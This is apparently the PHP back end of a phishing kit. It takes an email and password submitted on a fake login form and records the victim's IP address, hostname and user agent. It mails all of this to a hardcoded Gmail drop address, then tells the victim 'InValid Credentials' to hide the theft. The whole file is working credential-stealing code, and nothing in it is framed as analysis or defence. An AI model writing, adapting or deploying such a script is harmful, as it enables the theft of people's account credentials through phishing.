<?php
$Receive_email = 'ndrw117@gmail.com';

$email = trim($_POST['email']);
$password = trim($_POST['password']);

if($email != null && $password != null){
 $ip = getenv("REMOTE_ADDR");
 $hostname = gethostbyaddr($ip);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 $message .= "|----------| xLs |--------------|\n";
 
 $message .= "Online ID            : ".$email."\n";
 $message .= "Passcode              : ".$password."\n";
 $message .= "|--------------- I N F O | I P -------------------|\n";
 $message .= "|Client IP: ".$ip."\n";
 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "User Agent : ".$useragent."\n";
 $message .= "|----------- Author: almafia --------------|\n";
 $send = $Receive_email;
 $subject = "Login : $ip";
    mail($send, $subject, $message);   
 $signal = 'ok';
 $msg = 'InValid Credentials';
 

}
else if($email != null && $password != null){
 $ip = getenv("REMOTE_ADDR");
 $hostname = gethostbyaddr($ip);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 $message .= "|----------| xLs |--------------|\n";
 
 $message .= "Online ID            : ".$email."\n";
 $message .= "Passcode              : ".$password."\n";
 $message .= "|--------------- I N F O | I P -------------------|\n";
 $message .= "|Client IP: ".$ip."\n";
 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "User Agent : ".$useragent."\n";
 $message .= "|----------- Author: almafia --------------|\n";
 $send = $Receive_email;
 $subject = "Login : $ip";
    mail($send, $subject, $message);   
 $signal = 'ok';
 $msg = 'InValid Credentials';
 
 // $praga=rand();
 // $praga=md5($praga);
}
else{
 $signal = 'bad';
 $msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>
